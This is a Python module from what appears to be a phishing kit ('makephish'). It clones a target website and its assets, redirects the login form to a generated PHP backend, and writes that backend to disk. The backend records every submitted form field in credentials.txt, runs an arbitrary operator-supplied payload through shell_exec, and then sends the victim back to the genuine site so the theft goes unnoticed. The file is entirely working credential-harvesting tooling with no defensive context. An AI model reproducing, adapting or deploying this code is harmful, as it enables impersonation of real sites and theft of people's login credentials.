import os
import requests
import logging
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

log = logging.getLogger(__name__)

PHP_TEMPLATE = """<?php
// Simple PHP backend for makephish
// 1. Capture POST data
// 2. Execute a payload
// 3. Redirect back to the original site

$credentials_file = 'credentials.txt';
$redirect_url = '{redirect_url}';
$payload = '{payload}';

// Capture form data
if (!empty($_POST)) {{
    $data = "--- Credentials Captured ---\\n";
    foreach($_POST as $key => $value) {{
        $data .= "$key: $value\\n";
    }}
    $data .= "----------------------------\\n\\n";
    
    file_put_contents($credentials_file, $data, FILE_APPEND);
}}

// Execute the payload
if (!empty($payload)) {{
    shell_exec($payload);
}}

// Redirect the user
header("Location: $redirect_url");
exit();
?>"""


def generate_phishing_site(target_url, payload, output_dir):
    """
    Clones a target website and injects a payload.
    """
    log.info(f"Starting phishing generation for {target_url}")
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    try:
        # 1. Fetch the main page
        response = requests.get(target_url, headers=headers)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')

        # 2. Download all local assets (css, js, images)
        tags = {
            'link': 'href',
            'script': 'src',
            'img': 'src'
        }
        for tag, attr in tags.items():
            for resource in soup.find_all(tag):
                if resource.has_attr(attr):
                    res_url = resource[attr]
                    # Make URL absolute
                    abs_res_url = urljoin(target_url, res_url)

                    # Create local path
                    parsed_url = urlparse(abs_res_url)
                    local_res_path = os.path.join(output_dir, parsed_url.netloc,
                                                  parsed_url.path.lstrip('/'))

                    # Ensure directory exists
                    os.makedirs(os.path.dirname(local_res_path), exist_ok=True)

                    # Download asset
                    try:
                        res_response = requests.get(abs_res_url, headers=headers)
                        if res_response.status_code == 200:
                            with open(local_res_path, 'wb') as f:
                                f.write(res_response.content)

                            # Rewrite the HTML to point to the local asset
                            relative_path = os.path.relpath(local_res_path, output_dir)
                            resource[attr] = relative_path
                    except Exception as e:
                        log.error(f"Failed to download asset {abs_res_url}: {e}")

        # 3. Find form and patch action
        form = soup.find('form')
        if form:
            form['action'] = 'login.php'
            form['method'] = 'post'

        # 4. Create and save the PHP backend file
        php_content = PHP_TEMPLATE.format(redirect_url=target_url,
                                          payload=payload.replace("'", "\\'"))
        with open(os.path.join(output_dir, 'login.php'), 'w') as f:
            f.write(php_content)

        # 5. Save the modified HTML
        with open(os.path.join(output_dir, 'index.html'), 'w', encoding='utf-8') as f:
            f.write(str(soup))

        return {"status": "success", "path": output_dir}

    except requests.exceptions.RequestException as e:
        log.error(f"HTTP request failed for {target_url}: {e}")
        return {"error": f"Failed to fetch URL: {e}"}
    except Exception as e:
        log.error(f"An unexpected error occurred: {e}")
        return {"error": f"An unexpected error occurred: {e}"}
